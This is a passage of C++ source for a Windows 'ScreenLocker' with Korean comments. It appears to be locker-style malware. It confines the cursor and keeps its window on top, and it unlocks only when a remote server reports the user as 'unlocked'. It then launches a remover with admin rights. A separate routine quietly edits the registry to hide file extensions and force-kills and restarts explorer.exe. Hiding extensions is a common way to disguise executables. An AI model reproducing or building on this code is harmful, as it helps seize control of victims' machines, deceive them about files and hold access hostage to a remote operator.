            int titleLength = GetWindowTextW(browserHwnd, title, 255);
            
            if (titleLength == 0) {
                DWORD error = GetLastError();
                SaveToLogFile(userID, "GET_WINDOW_TEXT_ERROR: " + std::to_string(error));
            } else {
                SaveToLogFile(userID, "BROWSER_TITLE_CHECK: " + WStringToString(std::wstring(title)));
                
                // 창 제목에 우리가 설정한 신호가 포함되어 있는지 확인
                std::wstring titleStr(title);
                if (titleStr.find(L"UNLOCK_REQUEST_SENT") != std::wstring::npos) {
                    SaveToLogFile(userID, "UNLOCK_SIGNAL_RECEIVED");
                    signal_received = true;
                    
                    // 신호를 받았으니 브라우저 창을 C++ 코드에서 직접 닫아줍니다.
                    SendMessage(browserHwnd, WM_CLOSE, 0, 0);
                    break;
                }
            }
            
            Sleep(250); // 0.25초마다 확인 (기존: 0.5초)
        }

        // 커서 제한 해제
        ReleaseCursorConfinement();

        // 2. 브라우저에서 신호를 받은 경우에만 서버 상태 확인 진행
        if (signal_received) {
            SaveToLogFile(userID, "CHECKING_SERVER_STATUS");
            
            std::string status = "";
            int retryCount = 0;
            int maxRetries = 2; // 재시도 횟수도 3 → 2로 단축
            
            // 최대 2번까지 재시도
            while (retryCount < maxRetries) {
                status = CheckUserStatus();
                SaveToLogFile(userID, "SERVER_STATUS_RESPONSE_ATTEMPT_" + std::to_string(retryCount + 1) + ": " + status);
                
                if (status.find("unlocked") != std::string::npos) {
                    SaveToLogFile(userID, "UNLOCKED_STATUS_CONFIRMED_ON_ATTEMPT: " + std::to_string(retryCount + 1));
                    break;
                }
                
                retryCount++;
                if (retryCount < maxRetries) {
                    SaveToLogFile(userID, "RETRYING_STATUS_CHECK_IN_1_SECOND");
                    Sleep(1000); // 대기시간 2초 → 1초로 단축
                }
            }
            
            // 실제 서버 상태에 따라 분기 처리
            if (status.find("unlocked") != std::string::npos) {
                SaveToLogFile(userID, "STATUS_UNLOCKED_BY_SERVER");
                
                // 'unlocked' 상태이면 제거 프로그램을 관리자 권한으로 실행
                if (ExecuteRemoverWithAdmin()) {
                    SaveToLogFile(userID, "REMOVER_EXECUTION_INITIATED");
                    // 제거 프로그램 실행이 성공적으로 시작되면 스크린락커는 종료
                    PostMessage(hWnd, WM_DESTROY, 0, 0);
                } else {
                    // 사용자가 UAC에서 "아니요"를 클릭하는 등 실행에 실패한 경우
                    SaveToLogFile(userID, "REMOVER_EXECUTION_FAILED_OR_CANCELLED");
                    MessageBoxW(hWnd, L"Removal process was cancelled or failed.\nPlease try again.", 
                                L"Action Required", MB_OK | MB_ICONWARNING);
                    RestoreScreenLockerTopmost();
                }
            } else if (status.find("locked") != std::string::npos) {
                SaveToLogFile(userID, "STATUS_STILL_LOCKED_AFTER_" + std::to_string(maxRetries) + "_ATTEMPTS");
                MessageBoxW(hWnd, L"Still Blocked. Access denied by server.", 
                           L"Status: Locked", MB_OK | MB_ICONERROR);
                RestoreScreenLockerTopmost();
            } else {
                // 알 수 없는 상태 또는 서버 오류 (404 등)
                SaveToLogFile(userID, "UNKNOWN_SERVER_STATUS_AFTER_RETRIES: " + status);
                MessageBoxW(hWnd, L"User not found on server or connection error.\nPlease contact administrator.", 
                           L"Connection Error", MB_OK | MB_ICONWARNING);
                RestoreScreenLockerTopmost();
            }
        } else {
            // 타임아웃 또는 사용자가 창을 닫은 경우
            if (browser_still_exists) {
                SaveToLogFile(userID, "UNLOCK_SIGNAL_TIMEOUT");
                MessageBoxW(hWnd, L"Request timeout. Please try again.", 
                           L"Timeout", MB_OK | MB_ICONWARNING);
            } else {
                SaveToLogFile(userID, "BROWSER_CLOSED_BY_USER");
                MessageBoxW(hWnd, L"Process was cancelled.", 
                           L"Cancelled", MB_OK | MB_ICONINFORMATION);
            }
            RestoreScreenLockerTopmost();
        }
    } else {
        SaveToLogFile(userID, "BROWSER_CREATION_FAILED");
        MessageBoxW(hWnd, L"Failed to open unlock interface.\nPlease try again.", 
                   L"Error", MB_OK | MB_ICONERROR);
        RestoreScreenLockerTopmost();
    }
    
    // 다음 요청을 위해 브라우저 실행 상태를 초기화합니다.
    browserRunning = false;
    browserHwnd = nullptr;
    
    SaveToLogFile(userID, "UNLOCK_PROCESS_COMPLETED");
}

bool ScreenLocker::TestServerConnection() {
    SaveToLogFile(userID, "TESTING_SERVER_CONNECTION");
    
    std::string response;
    bool result = SendHttpRequest(L"/", L"GET", "", &response);
    
    if (result) {
        SaveToLogFile(userID, "SERVER_CONNECTION_TEST_SUCCESS");
        return true;
    } else {
        SaveToLogFile(userID, "SERVER_CONNECTION_TEST_FAILED");
        return false;
    }
}

void ScreenLocker::HideFileExtensions() {
    SaveToLogFile(userID, "ATTEMPTING_TO_HIDE_FILE_EXTENSIONS");
    
    HKEY hKey;
    LONG result;
    
    // Open registry key for current user's Explorer settings
    result = RegOpenKeyEx(HKEY_CURRENT_USER, 
                         L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
                         0, KEY_SET_VALUE, &hKey);
    
    if (result == ERROR_SUCCESS) {
        // Set HideFileExt to 1 (hide known file extensions)
        DWORD hideExtensions = 1;
        result = RegSetValueEx(hKey, L"HideFileExt", 0, REG_DWORD, 
                              (BYTE*)&hideExtensions, sizeof(DWORD));
        
        if (result == ERROR_SUCCESS) {
            SaveToLogFile(userID, "FILE_EXTENSIONS_HIDDEN_SUCCESS");
            
            // Refresh Explorer to apply changes immediately
            SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);
            SaveToLogFile(userID, "EXPLORER_REFRESHED");

            // Force Explorer process restart for immediate effect
            system("taskkill /f /im explorer.exe && start explorer.exe");
            Sleep(2000); // Wait for Explorer to restart
            
            SaveToLogFile(userID, "EXPLORER_FORCE_REFRESHED");

        } else {
            SaveToLogFile(userID, "FILE_EXTENSIONS_HIDE_FAILED: " + std::to_string(result));
        }
        
        RegCloseKey(hKey);
    } else {
        SaveToLogFile(userID, "REGISTRY_OPEN_FAILED: " + std::to_string(result));
    }
}